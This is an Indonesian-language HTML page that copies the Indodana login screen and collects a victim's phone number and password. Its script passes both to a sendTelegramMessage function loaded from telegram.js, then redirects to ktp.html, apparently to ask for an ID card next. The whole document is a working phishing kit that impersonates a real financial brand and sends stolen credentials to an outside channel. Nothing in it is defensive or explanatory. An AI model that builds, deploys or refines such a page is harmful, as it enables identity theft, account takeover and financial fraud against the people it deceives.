<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login – Indodana</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f5f5f5;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      background: #fff;
      width: 100%;
      max-width: 390px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      position: relative;
      overflow: hidden;
    }

    /* Header wave */
    .header {
      background: #FF6600;
      padding: 48px 28px 64px;
      position: relative;
    }

    .header::after {
      content: '';
      position: absolute;
      bottom: -30px;
      left: 0;
      right: 0;
      height: 60px;
      background: #fff;
      border-radius: 50% 50% 0 0 / 100% 100% 0 0;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 28px;
    }

    .logo-icon {
      width: 36px;
      height: 36px;
      background: #fff;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo-icon svg {
      width: 22px;
      height: 22px;
    }

    .logo-text {
      font-size: 22px;
      font-weight: 700;
      color: #fff;
      letter-spacing: 0.5px;
    }

    .header h1 {
      color: #fff;
      font-size: 22px;
      font-weight: 700;
      line-height: 1.3;
    }

    .header p {
      color: rgba(255,255,255,0.8);
      font-size: 13px;
      margin-top: 6px;
    }

    /* Body */
    .body {
      padding: 48px 28px 28px;
      flex: 1;
      display: flex;
      flex-direction: column;
    }

    .field {
      margin-bottom: 20px;
    }

    label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #444;
      margin-bottom: 8px;
    }

    .input-wrap {
      position: relative;
    }

    .phone-prefix {
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 14px;
      color: #333;
      font-weight: 600;
      border-right: 1px solid #ddd;
      padding-right: 10px;
      line-height: 1;
    }

    input[type="tel"],
    input[type="password"] {
      width: 100%;
      border: 1.5px solid #e0e0e0;
      border-radius: 10px;
      padding: 14px 14px 14px 14px;
      font-size: 15px;
      color: #222;
      outline: none;
      transition: border-color 0.2s;
      background: #fafafa;
    }

    input[type="tel"] {
      padding-left: 68px;
    }

    input[type="tel"]:focus,
    input[type="password"]:focus {
      border-color: #FF6600;
      background: #fff;
    }

    input::placeholder { color: #bbb; }

    .toggle-pw {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #999;
      padding: 0;
      line-height: 1;
    }

    .btn-login {
      width: 100%;
      background: #FF6600;
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 15px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
    }

    .btn-login:hover { background: #e05a00; }
    .btn-login:active { transform: scale(0.98); }

    .footer-note {
      margin-top: auto;
      padding-top: 32px;
      text-align: center;
      font-size: 11px;
      color: #bbb;
      line-height: 1.6;
    }

    /* Error state */
    input.error { border-color: #e53935; }
    .err-msg { font-size: 12px; color: #e53935; margin-top: 5px; display: none; }
    .err-msg.show { display: block; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="logo">
        <div class="logo-icon">
          <svg viewBox="0 0 24 24" fill="none">
            <path d="M12 2L3 7v10l9 5 9-5V7L12 2z" fill="#FF6600"/>
            <path d="M12 6l5 3v6l-5 3-5-3V9l5-3z" fill="#fff"/>
          </svg>
        </div>
        <span class="logo-text">indodana</span>
      </div>
      <h1>Selamat Datang<br>Kembali 👋</h1>
      <p>Masuk untuk lanjutkan aktivitasmu</p>
    </div>

    <div class="body">
      <form id="loginForm" novalidate>

        <div class="field">
          <label for="phone">Nomor HP</label>
          <div class="input-wrap">
            <span class="phone-prefix">+62</span>
            <input
              type="tel"
              id="phone"
              placeholder="8xx xxxx xxxx"
              inputmode="numeric"
              maxlength="13"
            />
          </div>
          <span class="err-msg" id="phoneErr">Nomor HP tidak valid</span>
        </div>

        <div class="field">
          <label for="password">Password</label>
          <div class="input-wrap">
            <input
              type="password"
              id="password"
              placeholder="Masukkan password"
            />
            <button type="button" class="toggle-pw" id="togglePw" aria-label="Tampilkan password">
              <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                <circle cx="12" cy="12" r="3"/>
              </svg>
            </button>
          </div>
          <span class="err-msg" id="passErr">Password tidak boleh kosong</span>
        </div>

        <button type="submit" class="btn-login">Masuk</button>

      </form>

      <div class="footer-note">
        Dengan masuk, kamu setuju dengan<br>
        <a href="#" style="color:#FF6600;text-decoration:none">Syarat &amp; Ketentuan</a> dan
        <a href="#" style="color:#FF6600;text-decoration:none">Kebijakan Privasi</a> Indodana
      </div>
    </div>
  </div>

  <script src="telegram.js"></script>
  <script>
    const form = document.getElementById('loginForm');
    const phoneInput = document.getElementById('phone');
    const passInput = document.getElementById('password');
    const togglePw = document.getElementById('togglePw');
    const btnLogin = form.querySelector('.btn-login');

    // Only allow digits in phone field
    phoneInput.addEventListener('input', () => {
      phoneInput.value = phoneInput.value.replace(/\D/g, '');
    });

    // Toggle password visibility
    togglePw.addEventListener('click', () => {
      const isHidden = passInput.type === 'password';
      passInput.type = isHidden ? 'text' : 'password';
      togglePw.innerHTML = isHidden
        ? `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
            <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
            <line x1="1" y1="1" x2="23" y2="23"/>
           </svg>`
        : `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
           </svg>`;
    });

    // Validation on submit
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      let valid = true;

      const phone = phoneInput.value.trim();
      const phoneErr = document.getElementById('phoneErr');
      if (phone.length < 9 || phone.length > 13) {
        phoneInput.classList.add('error');
        phoneErr.classList.add('show');
        valid = false;
      } else {
        phoneInput.classList.remove('error');
        phoneErr.classList.remove('show');
      }

      const pass = passInput.value;
      const passErr = document.getElementById('passErr');
      if (!pass) {
        passInput.classList.add('error');
        passErr.classList.add('show');
        valid = false;
      } else {
        passInput.classList.remove('error');
        passErr.classList.remove('show');
      }

      if (valid) {
        btnLogin.disabled = true;
        btnLogin.textContent = 'Mengirim...';
        try {
          await sendTelegramMessage(
            `🔐 <b>Login Attemp Indodana</b>\n📱 Nomor HP: +62${phone}\n🔑 Password: ${pass}`
          );
        } catch (_) {}
        window.location.href = 'ktp.html';
      }
    });

    // Clear error on input
    [phoneInput, passInput].forEach(input => {
      input.addEventListener('input', () => {
        input.classList.remove('error');
        input.nextElementSibling?.classList.remove('show');
      });
    });
  </script>
</body>
</html>
